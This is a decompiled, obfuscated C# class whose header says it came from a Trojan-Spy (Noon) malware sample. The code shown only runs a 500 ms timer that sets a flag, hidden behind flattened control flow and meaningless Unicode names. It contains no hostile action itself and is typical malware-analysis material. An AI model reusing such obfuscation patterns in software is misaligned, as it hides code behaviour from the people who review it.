// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System.Runtime.CompilerServices;
using System.Timers;

public sealed class \u000E\u2005
{
  private Timer \u0002;
  private \u0006\u2000 \u0003;
  public bool \u0005;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000E\u2005()
  {
    int num1 = 4;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 4:
          \u0003\u2004.\u0002();
          if (\u000E\u2005.\u0002())
          {
            num1 = 2;
            continue;
          }
          goto label_7;
        case 1:
        case 2:
          // ISSUE: explicit constructor call
          base.\u002Ector();
          this.\u0002 = new Timer();
          goto case 3;
        case 3:
          this.\u0005 = false;
          int num2 = 5;
          num1 = \u000E\u2005.\u0003() ? num2 : num2;
          continue;
        case 5:
          goto label_5;
        default:
          num1 = 3;
          continue;
      }
    }
label_5:
    return;
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000E\u2005(ref \u0006\u2000 _param1)
  {
    int num1 = 5;
    if (\u000E\u2005.\u0002())
      goto label_3;
label_1:
    this.\u0002 = new Timer();
    goto label_6;
label_2:
    int num2;
    num1 = num2;
label_3:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 5:
          \u0003\u2004.\u0002();
          num1 = 4;
          continue;
        case 1:
          goto label_6;
        case 2:
        case 3:
          goto label_1;
        case 4:
          goto label_7;
        case 6:
          goto label_8;
        default:
          goto label_4;
      }
    }
label_8:
    return;
label_4:
    num2 = 1;
    goto label_2;
label_7:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    num2 = 3;
    goto label_2;
label_6:
    this.\u0005 = false;
    this.\u0003 = _param1;
    num2 = 6;
    goto label_2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002()
  {
    int num1 = 2;
    if (\u000E\u2005.\u0003())
      ;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
        case 2:
          this.\u0002.Elapsed += new ElapsedEventHandler(this.\u0002);
          num2 = 3;
          break;
        case 1:
        case 3:
          this.\u0002.Interval = 500.0;
          goto case 4;
        case 4:
          this.\u0002.Start();
          num1 = 5;
          continue;
        case 5:
          goto label_1;
        default:
          num2 = 4;
          break;
      }
      num1 = num2;
    }
label_1:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002(object _param1, ElapsedEventArgs _param2) => this.\u0005 = true;

  internal static bool \u0002() => true;

  internal static bool \u0003() => false;
}
